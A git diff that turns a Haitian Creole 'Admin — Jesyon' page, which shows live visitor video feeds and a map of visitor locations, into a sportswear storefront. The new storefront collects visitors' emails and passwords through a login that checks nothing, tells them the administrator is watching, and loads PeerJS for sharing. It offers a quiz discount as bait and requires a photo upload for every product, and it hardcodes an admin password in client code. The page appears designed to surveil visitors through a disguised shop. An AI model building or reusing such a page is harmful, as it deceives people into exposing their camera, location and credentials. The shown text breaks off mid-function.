@@ -3,99 +3,330 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin — Jesyon</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<title>Style Sportif</title>
+<meta name="theme-color" content="#00cc66">
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     background: #0d0d0d; color: white;
     font-family: system-ui, sans-serif;
-    padding: 15px; min-height: 100vh;
+    min-height: 100vh; padding-bottom: 40px;
   }
-  h1 { text-align: center; color: #00cc66; font-size: 1.3rem; margin-bottom: 5px; }
-  #status { text-align: center; color: #ccc; font-size: 13px; margin-bottom: 15px; }
 
-  .tabs { display: flex; gap: 5px; max-width: 600px; margin: 0 auto 15px; }
-  .tab {
-    flex: 1; padding: 12px; background: #1c1c1c;
-    color: #ccc; border: 1px solid #333;
-    border-radius: 8px; cursor: pointer; font-size: 13px;
+  /* Pwen admin */
+  .dot-admin {
+    position: fixed; bottom: 15px; left: 15px;
+    width: 14px; height: 14px;
+    background: #333; border-radius: 50%;
+    cursor: pointer; opacity: 0.35; z-index: 1000;
   }
-  .tab.active { background: #00cc66; color: white; border-color: #00cc66; }
+  .dot-admin:hover { opacity: 1; background: #00cc66; }
 
-  #videoGrid {
-    display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-    gap: 12px; max-width: 1200px; margin: 0 auto;
+  /* LOGIN */
+  .login-screen {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    background: #0d0d0d;
+    display: flex; align-items: center; justify-content: center;
+    padding: 20px; z-index: 999;
   }
-  .video-card {
-    background: #1c1c1c; border-radius: 12px; padding: 10px;
-    text-align: center; border: 1px solid #333; position: relative;
+  .login-screen.hidden { display: none !important; }
+  .login-box {
+    background: #1a1a1a; border-radius: 16px;
+    padding: 30px 25px; max-width: 340px; width: 100%;
+    border: 1px solid #2a2a2a; text-align: center;
   }
-  .video-card video {
-    width: 100%; border-radius: 8px; background: #000;
-    display: block; min-height: 180px;
+  .login-box h2 { font-size: 1.4rem; margin-bottom: 8px; font-weight: normal; }
+  .login-box .sub { color: #aaa; font-size: 13px; margin-bottom: 20px; }
+  .login-box input {
+    width: 100%; padding: 14px;
+    border-radius: 10px; border: 1px solid #333;
+    background: #f5f5f5; color: #111;
+    font-size: 15px; margin-bottom: 12px;
   }
-  .video-card p { margin-top: 8px; font-size: 12px; color: #999; }
-  .video-card .sound-toggle {
-    width: 100%; margin-top: 6px; padding: 8px;
-    background: #2196f3; color: white; border: none;
-    border-radius: 8px; cursor: pointer;
-    font-size: 12px; font-weight: bold;
+  .login-box input:focus { outline: none; border-color: #00cc66; }
+  .login-box button {
+    width: 100%; padding: 15px;
+    background: #00cc66; color: white;
+    border: none; border-radius: 10px;
+    font-size: 15px; font-weight: bold;
+    cursor: pointer; margin-top: 5px;
   }
-  .video-card .sound-toggle.off { background: #cc3333; }
-  .live-dot {
-    position: absolute; top: 18px; left: 18px;
-    width: 10px; height: 10px; border-radius: 50%;
-    background: #ff3333; animation: pulse 1s infinite; z-index: 5;
+  .login-box .err { color: #ff6666; font-size: 12px; margin-top: 10px; min-height: 16px; }
+
+  /* APP */
+  .app-content { display: none; }
+  .app-content.active { display: block !important; }
+
+  header { text-align: center; padding: 25px 20px 15px; border-bottom: 1px solid #222; }
+  header h1 { font-size: 1.4rem; letter-spacing: 4px; color: #00cc66; text-transform: uppercase; font-weight: normal; margin-bottom: 4px; }
+  header p { color: #888; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; }
+
+  .cta { margin: 25px auto 20px; max-width: 360px; padding: 0 20px; text-align: center; }
+  .cta button {
+    width: 100%; padding: 18px 20px;
+    background: linear-gradient(135deg, #00cc66, #009944);
+    color: white; border: none; border-radius: 12px;
+    font-size: 15px; font-weight: bold;
+    cursor: pointer; box-shadow: 0 4px 15px rgba(0, 204, 102, 0.3);
+  }
+  .cta button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  .active-panel { margin: 25px auto 20px; max-width: 360px; padding: 0 20px; text-align: center; }
+  .active-panel.hidden { display: none !important; }
+  .active-panel .card {
+    background: #1a1a1a; border: 1px solid #00cc66;
+    border-radius: 12px; padding: 20px;
+  }
+  .active-panel .dot {
+    display: inline-block; width: 10px; height: 10px;
+    border-radius: 50%; background: #ff3333;
+    margin-right: 8px; animation: pulse 1s infinite;
+    vertical-align: middle;
   }
   @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+  .active-panel p { font-size: 14px; color: #ddd; }
+  .btn-stop {
+    width: 100%; margin-top: 15px; padding: 14px;
+    background: #cc3333; color: white; border: none;
+    border-radius: 10px; font-size: 13px; font-weight: bold; cursor: pointer;
+  }
+  .btn-quiz {
+    width: 100%; margin-top: 10px; padding: 14px;
+    background: linear-gradient(135deg, #d4af37, #b8941f);
+    color: white; border: none; border-radius: 10px;
+    font-size: 13px; font-weight: bold; cursor: pointer;
+  }
 
-  #map {
-    height: 60vh; max-width: 900px;
-    margin: 0 auto 15px; border-radius: 12px;
-    border: 1px solid #333; z-index: 1;
-  }
-  .locations-list {
-    max-width: 900px; margin: 0 auto;
-    display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-    gap: 8px;
-  }
-  .loc-card {
-    background: #1c1c1c; border: 1px solid #333;
-    border-radius: 10px; padding: 12px; font-size: 12px;
-  }
-  .loc-card .name { color: #00cc66; font-weight: bold; margin-bottom: 5px; }
-  .loc-card .info { color: #aaa; font-size: 11px; line-height: 1.5; }
+  #status { text-align: center; color: #888; font-size: 12px; margin-top: 10px; padding: 0 20px; min-height: 16px; }
 
-  .empty { text-align: center; color: #666; padding: 40px; font-size: 13px; grid-column: 1 / -1; }
+  .gallery-title {
+    text-align: center; margin: 30px 0 12px;
+    font-size: 11px; letter-spacing: 3px;
+    color: #666; text-transform: uppercase;
+  }
+  .gallery-title::before, .gallery-title::after {
+    content: ""; display: inline-block;
+    width: 30px; height: 1px; background: #333;
+    vertical-align: middle; margin: 0 10px;
+  }
+  .gallery {
+    display: grid; grid-template-columns: repeat(3, 1fr);
+    gap: 4px; padding: 4px; max-width: 900px; margin: 0 auto;
+  }
+  .gallery.hidden { display: none !important; }
+  .item {
+    position: relative; aspect-ratio: 1/1;
+    overflow: hidden; background: #1a1a1a;
+    cursor: pointer; border-radius: 6px;
+  }
+  .item img { width: 100%; height: 100%; object-fit: cover; display: block; }
+  .item .label {
+    position: absolute; bottom: 0; left: 0; right: 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+    padding: 18px 6px 6px; font-size: 9px;
+    color: #fff; text-transform: uppercase; z-index: 2; text-align: center;
+  }
+  .item .price { color: #00cc66; font-weight: bold; font-size: 11px; display: block; margin-top: 2px; }
+  .item .price-old { color: #888; text-decoration: line-through; font-size: 10px; margin-right: 4px; }
+  .item .add-cart {
+    position: absolute; top: 5px; right: 5px;
+    width: 30px; height: 30px;
+    background: #00cc66; color: white;
+    border: none; border-radius: 50%;
+    font-size: 16px; font-weight: bold; cursor: pointer; z-index: 3;
+  }
+
   .hidden { display: none !important; }
+  .empty { grid-column: 1 / -1; text-align: center; color: #666; padding: 30px; font-size: 13px; }
+  footer { text-align: center; color: #444; font-size: 10px; margin-top: 30px; padding: 0 20px; }
+
+  .cart-float {
+    position: fixed; bottom: 20px; right: 20px;
+    background: #00cc66; color: white;
+    padding: 15px 20px; border-radius: 50px;
+    font-size: 16px; font-weight: bold; cursor: pointer;
+    box-shadow: 0 4px 15px rgba(0, 204, 102, 0.5);
+    z-index: 998; display: flex; align-items: center; gap: 8px;
+  }
+
+  .modal-bg {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.9);
+    display: flex; align-items: center; justify-content: center;
+    padding: 15px; z-index: 1001; overflow-y: auto;
+  }
+  .modal-bg.hidden { display: none !important; }
+  .modal {
+    background: #1c1c1c; border-radius: 16px; padding: 25px 20px;
+    max-width: 480px; width: 100%; border: 1px solid #333;
+    position: relative; max-height: 90vh; overflow-y: auto;
+  }
+  .modal h2 { color: #00cc66; margin-bottom: 10px; font-size: 1.2rem; text-align: center; }
+  .modal .quiz-sub { color: #888; font-size: 12px; text-align: center; margin-bottom: 15px; }
+  .close-btn {
+    position: absolute; top: 10px; right: 15px;
+    background: none; border: none; color: #888;
+    font-size: 28px; cursor: pointer; line-height: 1;
+  }
+
+  .quiz-progress {
+    display: flex; justify-content: space-between;
+    font-size: 12px; color: #aaa; margin-bottom: 15px;
+  }
+  .quiz-modal h3 { font-size: 15px; color: #fff; margin-bottom: 15px; line-height: 1.4; min-height: 40px; }
+  .quiz-options { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
+  .quiz-opt {
+    background: #0d0d0d; border: 2px solid #333;
+    color: #fff; padding: 12px;
+    border-radius: 10px; font-size: 14px;
+    cursor: pointer; text-align: left;
+  }
+  .quiz-opt:hover { border-color: #00cc66; }
+  .quiz-opt.selected { border-color: #00cc66; background: #0d1a10; }
+  .quiz-opt.correct { border-color: #00cc66; background: #0d3a1a; }
+  .quiz-opt.wrong { border-color: #cc3333; background: #3a0d0d; }
+
+  .cart-item {
+    display: flex; gap: 10px;
+    background: #0d0d0d; border: 1px solid #333;
+    border-radius: 8px; padding: 10px;
+    margin-bottom: 8px; align-items: center;
+  }
+  .cart-item img { width: 50px; height: 50px; object-fit: cover; border-radius: 6px; }
+  .cart-item-info { flex: 1; }
+  .cart-item-info .name { font-size: 13px; font-weight: bold; }
+  .cart-item-info .price { font-size: 12px; color: #00cc66; }
+  .cart-item-info .price-old { font-size: 11px; color: #888; text-decoration: line-through; margin-right: 5px; }
+  .cart-item .remove {
+    background: #cc3333; color: white; border: none;
+    width: 26px; height: 26px; border-radius: 50%;
+    font-size: 14px; cursor: pointer;
+  }
+  .cart-total { background: #0d0d0d; border-radius: 10px; padding: 12px; margin-bottom: 15px; }
+  .total-row { display: flex; justify-content: space-between; font-size: 13px; padding: 5px 0; color: #ddd; }
+  .total-row.discount { color: #00cc66; }
+  .total-row.final { border-top: 1px solid #333; margin-top: 5px; padding-top: 10px; font-size: 16px; font-weight: bold; color: #00cc66; }
+
+  .order-modal .form-group { margin-bottom: 12px; }
+  .order-modal label { display: block; font-size: 12px; color: #aaa; margin-bottom: 5px; }
+  .order-modal input, .order-modal select {
+    width: 100%; padding: 12px; border-radius: 8px;
+    border: 1px solid #333; background: #0d0d0d; color: white;
+    font-size: 14px;
+  }
+  .order-prod {
+    background: #0d0d0d; border: 1px solid #333;
+    border-radius: 10px; padding: 12px; margin-bottom: 12px;
+  }
+  .order-prod .prod-name { font-size: 13px; font-weight: bold; color: #00cc66; margin-bottom: 8px; }
+  .order-prod input[type="file"] {
+    width: 100%; font-size: 12px; color: #aaa;
+    padding: 8px; background: #1c1c1c; border-radius: 6px;
+    border: 1px dashed #444;
+  }
+  .order-prod .preview { margin-top: 8px; text-align: center; }
+  .order-prod .preview img { max-width: 100px; max-height: 100px; border-radius: 6px; }
 </style>
 </head>
 <body>
 
-  <h1>🎥 Admin — Jesyon</h1>
-  <p id="status">⏳ Ap konekte...</p>
+  <div class="dot-admin" id="dotAdmin"></div>
 
-  <div class="tabs">
-    <button class="tab active" id="tabVisitors">👁 Visitors</button>
-    <button class="tab" id="tabMap">🗺️ Kat</button>
-  </div>
-
-  <div id="visitorsView">
-    <div id="videoGrid">
-      <div class="empty">Ap tann visitor yo konekte...</div>
+  <div class="login-screen" id="loginScreen">
+    <div class="login-box">
+      <h2>🔒 Antre</h2>
+      <p class="sub">Antre email ou ak modpas ou</p>
+      <input type="email" id="emailInput" placeholder="Email ou">
+      <input type="password" id="pwInput" placeholder="Modpas">
+      <button id="btnLogin">Antre</button>
+      <p class="err" id="err"></p>
     </div>
   </div>
 
-  <div id="mapView" class="hidden">
-    <div id="map"></div>
-    <div class="locations-list" id="locationsList">
-      <div class="empty">Pa gen visitors lokalize</div>
+  <div class="app-content" id="appContent">
+    <header>
+      <h1>Style Sportif</h1>
+      <p>Koleksyon 2026 · Chòt · Mai · Ekipman</p>
+    </header>
+
+    <div class="cta" id="ctaView">
+      <button id="btnStart">✅ Voir plus</button>
+    </div>
+
+    <div class="active-panel hidden" id="activeView">
+      <div class="card">
+        <p><span class="dot"></span><strong>Bienvenue !</strong></p>
+        <p style="margin-top:8px; font-size:13px; color:#aaa;">Administratè a ap wè ou.</p>
+        <button id="btnStop" class="btn-stop">⛔ Sispann Pataje</button>
+        <button id="btnQuiz" class="btn-quiz">🎯 Fè Quiz la — Jwenn $8 Rabè</button>
+      </div>
+    </div>
+
+    <p id="status"></p>
+
+    <div class="gallery-title">Koleksyon Nou</div>
+    <div class="gallery" id="galleryFirst"><div class="empty">⏳ Ap chaje...</div></div>
+    <div class="gallery hidden" id="galleryRest"></div>
+
+    <div class="cart-float" id="cartFloat">🛒 <span id="cartCount">0</span></div>
+    <footer>© 2026 — Tout dwa rezève</footer>
+  </div>
+
+  <!-- MODAL QUIZ -->
+  <div class="modal-bg hidden" id="quizModal">
+    <div class="modal quiz-modal">
+      <button class="close-btn" id="quizClose">×</button>
+      <h2>🎯 Quiz Espò</h2>
+      <p class="quiz-sub">20 kesyon · 20/20 pou jwenn $8 rabè</p>
+      <div class="quiz-progress">
+        <span id="quizProgress">Kesyon 1 / 20</span>
+        <span id="quizScore">✅ 0</span>
+      </div>
+      <h3 id="quizQuestion">...</h3>
+      <div class="quiz-options" id="quizOptions"></div>
+      <button id="quizNext" class="btn-quiz" disabled>Swivan →</button>
+    </div>
+  </div>
+
+  <!-- MODAL PANYE -->
+  <div class="modal-bg hidden" id="cartModal">
+    <div class="modal cart-modal">
+      <button class="close-btn" id="cartClose">×</button>
+      <h2>🛒 Panye ou</h2>
+      <div id="cartItems"><div class="empty">Panye ou vid</div></div>
+      <div class="cart-total">
+        <div class="total-row"><span>Total:</span><span id="cartTotal">$0</span></div>
+        <div class="total-row discount hidden" id="discountRow">
+          <span>🎉 Rabè (-$8/pwodwi):</span><span id="discountTotal">-$0</span>
+        </div>
+        <div class="total-row final"><span>Peye:</span><span id="cartFinal">$0</span></div>
+      </div>
+      <button class="btn-quiz" id="btnCheckout">✅ Kòmande Kounye a</button>
+    </div>
+  </div>
+
+  <!-- MODAL KÒMAND -->
+  <div class="modal-bg hidden" id="orderModal">
+    <div class="modal order-modal">
+      <button class="close-btn" id="orderClose">×</button>
+      <h2>📦 Finalize Kòmand</h2>
+      <div class="form-group">
+        <label>Email ou</label>
+        <input type="email" id="orderName" readonly>
+      </div>
+      <div class="form-group">
+        <label>Metòd peman</label>
+        <select id="orderPayment">
+          <option value="MonCash">MonCash</option>
+          <option value="NatCash">NatCash</option>
+        </select>
+      </div>
+      <div id="orderProducts"></div>
+      <button class="btn-quiz" id="btnSubmitOrder">✅ Konfime Kòmand</button>
     </div>
   </div>
 
 <script src="https://unpkg.com/peerjs@1.5.0/dist/peerjs.min.js"></script>
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
@@ -117,49 +348,452 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 /* ============================================
-   TABS
+   VISITOR ID
    ============================================ */
-const tabVisitors  = document.getElementById("tabVisitors");
-const tabMap       = document.getElementById("tabMap");
-const visitorsView = document.getElementById("visitorsView");
-const mapView      = document.getElementById("mapView");
-
-tabVisitors.onclick = () => {
-  tabVisitors.classList.add("active");
-  tabMap.classList.remove("active");
-  visitorsView.classList.remove("hidden");
-  mapView.classList.add("hidden");
-};
-
-tabMap.onclick = () => {
-  tabMap.classList.add("active");
-  tabVisitors.classList.remove("active");
-  mapView.classList.remove("hidden");
-  visitorsView.classList.add("hidden");
-  setTimeout(() => { if (map) map.invalidateSize(); }, 100);
-};
-
-/* ============================================
-   KAT
-   ============================================ */
-let map = null;
-let markers = {};
-
-function initMap() {
-  map = L.map('map').setView([18.5392, -72.3360], 10);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '© OpenStreetMap',
-    maxZoom: 19
-  }).addTo(map);
+let VISITOR_ID = localStorage.getItem("visitor_id");
+if (!VISITOR_ID) {
+  VISITOR_ID = "v_" + Math.random().toString(36).substring(2, 10);
+  localStorage.setItem("visitor_id", VISITOR_ID);
 }
 
 /* ============================================
-   PEERJS
+   TI PWEN ADMIN
    ============================================ */
+const ADMIN_PASSWORD = "Zane200420042005";
+
+document.getElementById("dotAdmin").onclick = () => {
+  const pw = prompt("Modpas admin:");
+  if (pw === null) return;
+  if (pw.replace(/\s/g, "") === ADMIN_PASSWORD) {
+    window.location.href = "admin.html";
+  } else {
+    alert("❌ Modpas pa bon.");
+  }
+};
+
+/* ============================================
+   LOGIN (email + modpas)
+   ============================================ */
+const loginScreen = document.getElementById("loginScreen");
+const appContent  = document.getElementById("appContent");
+const emailInput  = document.getElementById("emailInput");
+const pwInput     = document.getElementById("pwInput");
+const btnLogin    = document.getElementById("btnLogin");
+const err         = document.getElementById("err");
+
+btnLogin.onclick = () => {
+  const email = emailInput.value.trim();
+  const pw = pwInput.value.trim();
+
+  if (email.length === 0) { err.innerText = "Antre yon email."; return; }
+  if (!email.includes("@")) { err.innerText = "Email pa valid."; return; }
+  if (pw.length < 4) { err.innerText = "Modpas dwe gen 4+ karaktè."; return; }
+
+  localStorage.setItem("visitor_email", email);
+  loginScreen.classList.add("hidden");
+  appContent.classList.add("active");
+};
+
+pwInput.addEventListener("keydown", (e) => {
+  if (e.key === "Enter") btnLogin.click();
+});
+
+/* ============================================
+   GALRI
+   ============================================ */
+let ALL_IMAGES = [];
+let hasDiscount = false;
+
+function getFinalPrice(priceStr) {
+  const num = parseFloat((priceStr || "0").replace(/[^0-9.]/g, ""));
+  if (isNaN(num)) return { original: 0, final: 0 };
+  if (hasDiscount) return { original: num, final: Math.max(0, num - 8) };
+  return { original: num, final: num };
+}
+
+function buildItem(img) {
+  const p = getFinalPrice(img.price);
+  const priceHtml = hasDiscount && p.original > 0
+    ? `<span class="price-old">$${p.original}</span><span class="price">$${p.final}</span>`
+    : `<span class="price">$${p.final || img.price || ''}</span>`;
+
+  return `<div class="item" data-key="${img.key}" data-name="${img.name}" data-price="${img.price || ''}">
+    <img src="${img.url}" loading="lazy" alt="${img.name}"
+         onerror="this.style.display='none';this.parentElement.style.background='#2a2a2a';">
+    <button class="add-cart" data-key="${img.key}">+</button>
+    <div class="label">${img.name}${priceHtml}</div>
+  </div>`;
+}
+
+function renderGallery() {
+  const first = document.getElementById("galleryFirst");
+  const rest  = document.getElementById("galleryRest");
+
+  if (ALL_IMAGES.length === 0) {
+    first.innerHTML = '<div class="empty">Pa gen pwodwi pou kounye a</div>';
+    rest.innerHTML = "";
+    rest.classList.add("hidden");
+    return;
+  }
+
+  first.innerHTML = ALL_IMAGES.slice(0, 6).map(buildItem).join("");
+
+  if (ALL_IMAGES.length > 6) {
+    rest.innerHTML = ALL_IMAGES.slice(6).map(buildItem).join("");
+  } else {
+    rest.innerHTML = "";
+  }
+
+  document.querySelectorAll(".add-cart").forEach(btn => {
+    btn.onclick = (e) => {
+      e.stopPropagation();
+      const key = btn.dataset.key;
+      const img = ALL_IMAGES.find(i => i.key === key);
+      if (img) addToCart(img);
+    };
+  });
+}
+
+db.ref("images").on("value", (snapshot) => {
+  const data = snapshot.val();
+  ALL_IMAGES = data
+    ? Object.entries(data).map(([k, v]) => ({ key: k, ...v })).sort((a, b) => b.createdAt - a.createdAt)
+    : [];
+  renderGallery();
+});
+
+/* ============================================
+   PANYE
+   ============================================ */
+let cart = JSON.parse(localStorage.getItem("cart") || "[]");
+
+function saveCart() {
+  localStorage.setItem("cart", JSON.stringify(cart));
+  updateCartUI();
+}
+
+function addToCart(img) {
+  const exists = cart.find(c => c.key === img.key);
+  if (exists) {
+    exists.qty = (exists.qty || 1) + 1;
+  } else {
+    cart.push({
+      key: img.key, name: img.name,
+      price: img.price, url: img.url, qty: 1
+    });
+  }
+  saveCart();
+  const cartFloat = document.getElementById("cartFloat");
+  cartFloat.style.transform = "scale(1.2)";
+  setTimeout(() => cartFloat.style.transform = "", 200);
+}
+
+function removeFromCart(key) {
+  cart = cart.filter(c => c.key !== key);
+  saveCart();
+}
+
+function updateCartUI() {
+  const count = cart.reduce((sum, c) => sum + (c.qty || 1), 0);
+  document.getElementById("cartCount").innerText = count;
+
+  const cartItems = document.getElementById("cartItems");
+  if (cart.length === 0) {
+    cartItems.innerHTML = '<div class="empty">Panye ou vid</div>';
+    document.getElementById("cartTotal").innerText = "$0";
+    document.getElementById("cartFinal").innerText = "$0";
+    document.getElementById("discountRow").classList.add("hidden");
+    return;
+  }
+
+  let total = 0;
+  let totalAfterDiscount = 0;
+
+  cartItems.innerHTML = cart.map(item => {
+    const p = getFinalPrice(item.price);
+    const qty = item.qty || 1;
+    total += p.original * qty;
+    totalAfterDiscount += p.final * qty;
+
+    const priceHtml = hasDiscount && p.original > 0
+      ? `<span class="price-old">$${p.original}</span><span class="price">$${p.final}</span>`
+      : `<span class="price">$${p.final || item.price}</span>`;
+
+    return `<div class="cart-item">
+      <img src="${item.url}" onerror="this.style.background='#333'">
+      <div class="cart-item-info">
+        <div class="name">${item.name} ${qty > 1 ? `×${qty}` : ''}</div>
+        <div>${priceHtml}</div>
+      </div>
+      <button class="remove" data-key="${item.key}">×</button>
+    </div>`;
+  }).join("");
+
+  document.getElementById("cartTotal").innerText = "$" + total;
+  document.getElementById("cartFinal").innerText = "$" + totalAfterDiscount;
+
+  if (hasDiscount) {
+    document.getElementById("discountRow").classList.remove("hidden");
+    document.getElementById("discountTotal").innerText = "-$" + (total - totalAfterDiscount);
+  } else {
+    document.getElementById("discountRow").classList.add("hidden");
+  }
+
+  cartItems.querySelectorAll(".remove").forEach(btn => {
+    btn.onclick = () => removeFromCart(btn.dataset.key);
+  });
+}
+
+document.getElementById("cartFloat").onclick = () => {
+  document.getElementById("cartModal").classList.remove("hidden");
+  updateCartUI();
+};
+
+document.getElementById("cartClose").onclick = () => {
+  document.getElementById("cartModal").classList.add("hidden");
+};
+
+/* ============================================
+   QUIZ — 20 KESYON
+   ============================================ */
+const QUIZ = [
+  { q: "Konbyen jwè nan yon ekip foutbòl sou teren?", o: ["9", "10", "11", "12"], a: 2 },
+  { q: "Ki peyi ki genyen World Cup 2022?", o: ["Frans", "Ajantin", "Brezil", "Almay"], a: 1 },
+  { q: "Konbyen tan yon match foutbòl dire?", o: ["60 min", "80 min", "90 min", "120 min"], a: 2 },
+  { q: "Ki jwè ki gen plis Ballon d'Or?", o: ["Cristiano Ronaldo", "Lionel Messi", "Neymar", "Mbappé"], a: 1 },
+  { q: "Ki koulè kat ki vle di ekspilsyon?", o: ["Jòn", "Vèt", "Wouj", "Ble"], a: 2 },
+  { q: "Ki peyi ki genyen plis World Cup?", o: ["Almay", "Itali", "Brezil", "Ajantin"], a: 2 },
+  { q: "Konbyen mèt distans yon penalti?", o: ["9 m", "10 m", "11 m", "12 m"], a: 2 },
+  { q: "Konbyen jwè nan yon ekip baskètbòl?", o: ["4", "5", "6", "7"], a: 1 },
+  { q: "Ki ekip NBA ki genyen plis chanpyona?", o: ["Miami Heat", "Boston Celtics", "Lakers", "Bulls"], a: 1 },
+  { q: "Konbyen pwen yon panier deyò liy 3?", o: ["2", "3", "4", "1"], a: 1 },
+  { q: "Ki wotè yon panier baskètbòl?", o: ["2.5 m", "3 m", "3.05 m", "3.5 m"], a: 2 },
+  { q: "Ki jwè ki rele 'King James'?", o: ["Michael Jordan", "LeBron James", "Kobe Bryant", "Stephen Curry"], a: 1 },
+  { q: "Konbyen set yon match Grand Slam?", o: ["2", "3", "4", "5"], a: 1 },
+  { q: "Ki tounwa tenis sou tè wouj?", o: ["Wimbledon", "US Open", "Roland Garros", "Australian Open"], a: 2 },
+  { q: "Ki jwè ki gen plis tit Grand Slam?", o: ["Roger Federer", "Rafael Nadal", "Novak Djokovic", "Andy Murray"], a: 2 },
+  { q: "Konbyen jwè nan yon ekip volleybòl?", o: ["5", "6", "7", "8"], a: 1 },
+  { q: "Nan ki espò ou itilize 'birdie'?", o: ["Tenis", "Badminton", "Tenis tab", "Squash"], a: 1 },
+  { q: "Ki espò 'Usain Bolt' te fè?", o: ["Natasyon", "Atletis", "Bisiklèt", "Boks"], a: 1 },
+  { q: "Konbyen wonn yon match boks (tit)?", o: ["8", "10", "12", "15"], a: 2 },
+  { q: "Ki peyi ki envante 'Judo'?", o: ["Chin", "Kore", "Japon", "Thailand"], a: 2 }
+];
+
+let quizState = { current: 0, score: 0, selected: null };
+
+function openQuiz() {
+  quizState = { current: 0, score: 0, selected: null };
+  document.getElementById("quizModal").classList.remove("hidden");
+  renderQuizQuestion();
+}
+
+function renderQuizQuestion() {
+  const q = QUIZ[quizState.current];
+  document.getElementById("quizProgress").innerText = `Kesyon ${quizState.current + 1} / ${QUIZ.length}`;
+  document.getElementById("quizScore").innerText = `✅ ${quizState.score}`;
+  document.getElementById("quizQuestion").innerText = q.q;
+
+  const opts = document.getElementById("quizOptions");
+  opts.innerHTML = q.o.map((opt, i) => 
+    `<button class="quiz-opt" data-index="${i}">${String.fromCharCode(65 + i)}) ${opt}</button>`
+  ).join("");
+
+  document.getElementById("quizNext").disabled = true;
+  document.getElementById("quizNext").innerText = quizState.current === QUIZ.length - 1 ? "✅ Fini" : "Swivan →";
+
+  opts.querySelectorAll(".quiz-opt").forEach(btn => {
+    btn.onclick = () => {
+      if (quizState.selected !== null) return;
+      const idx = parseInt(btn.dataset.index);
+      quizState.selected = idx;
+
+      opts.querySelectorAll(".quiz-opt").forEach(b => b.classList.remove("selected"));
+      btn.classList.add("selected");
+
+      if (idx === q.a) {
+        btn.classList.add("correct");
+        quizState.score++;
+      } else {
+        btn.classList.add("wrong");
+        opts.querySelectorAll(".quiz-opt")[q.a].classList.add("correct");
+      }
+
+      document.getElementById("quizScore").innerText = `✅ ${quizState.score}`;
+      document.getElementById("quizNext").disabled = false;
+    };
+  });
+}
+
+document.getElementById("quizNext").onclick = () => {
+  if (quizState.current < QUIZ.length - 1) {
+    quizState.current++;
+    quizState.selected = null;
+    renderQuizQuestion();
+  } else {
+    const score = quizState.score;
+    document.getElementById("quizModal").classList.add("hidden");
+
+    if (score === 20) {
+      hasDiscount = true;
+      localStorage.setItem("has_discount", "1");
+      alert("🎉 BRAVO ! Ou fè 20/20 !\nOu jwenn rabè $8 sou chak pwodwi !");
+      renderGallery();
+      updateCartUI();
+    } else {
+      alert(`Ou fè ${score}/20.\nOu bezwen 20/20 pou jwenn rabè a.`);
+    }
+  }
+};
+
+document.getElementById("quizClose").onclick = () => {
+  document.getElementById("quizModal").classList.add("hidden");
+};
+
+/* ============================================
+   KÒMAND
+   ============================================ */
+function openOrderModal() {
+  if (cart.length === 0) {
+    alert("Panye ou vid.");
+    return;
+  }
+
+  document.getElementById("cartModal").classList.add("hidden");
+  document.getElementById("orderModal").classList.remove("hidden");
+
+  document.getElementById("orderName").value = localStorage.getItem("visitor_email") || "";
+
+  const container = document.getElementById("orderProducts");
+  container.innerHTML = cart.map((item) => {
+    const p = getFinalPrice(item.price);
+    const qty = item.qty || 1;
+    return `<div class="order-prod" data-key="${item.key}">
+      <div class="prod-name">📦 ${item.name} ${qty > 1 ? `×${qty}` : ''} — $${p.final * qty}</div>
+      <input type="file" accept="image/*" data-key="${item.key}" class="prod-photo">
+      <div class="preview" id="preview_${item.key}"></div>
+    </div>`;
+  }).join("");
+
+  container.querySelectorAll(".prod-photo").forEach(input => {
+    input.onchange = async (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+      if (file.size > 2 * 1024 * 1024) {
+        alert("❌ Foto a twò gwo (maks 2 MB).");
+        e.target.value = "";
+        return;
+      }
+      const base64 = await fileToBase64Compressed(file);
+      document.getElementById("preview_" + input.dataset.key).innerHTML = `<img src="${base64}">`;
+      input.dataset.base64 = base64;
+    };
+  });
+}
+
+function fileToBase64Compressed(file, maxSize = 600, quality = 0.7) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onload = (e) => {
+      const img = new Image();
+      img.onload = () => {
+        let w = img.width, h = img.height;
+        if (w > h && w > maxSize) { h = Math.round((h * maxSize) / w); w = maxSize; }
+        else if (h > maxSize) { w = Math.round((w * maxSize) / h); h = maxSize; }
+        const canvas = document.createElement("canvas");
+        canvas.width = w; canvas.height = h;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(img, 0, 0, w, h);
+        resolve(canvas.toDataURL("image/jpeg", quality));
+      };
+      img.onerror = () => reject(new Error("Pa ka chaje imaj la"));
+      img.src = e.target.result;
+    };
+    reader.onerror = () => reject(new Error("Pa ka li fichye a"));
+    reader.readAsDataURL(file);
+  });
+}
+
+document.getElementById("orderClose").onclick = () => {
+  document.getElementById("orderModal").classList.add("hidden");
+};
+
+document.getElementById("btnCheckout").onclick = () => {
+  openOrderModal();
+};
+
+document.getElementById("btnSubmitOrder").onclick = async () => {
+  const email = localStorage.getItem("visitor_email");
+  const payment = document.getElementById("orderPayment").value;
+
+  const photos = document.querySelectorAll(".prod-photo");
+  for (let input of photos) {
+    if (!input.dataset.base64) {
+      alert("⚠️ Ou dwe pran yon foto pou chak pwodwi.");
+      return;
+    }
+  }
+
+  const btn = document.getElementById("btnSubmitOrder");
+  btn.disabled = true;
+  btn.innerText = "⏳ Ap voye...";
+
+  for (let item of cart) {
+    const qty = item.qty || 1;
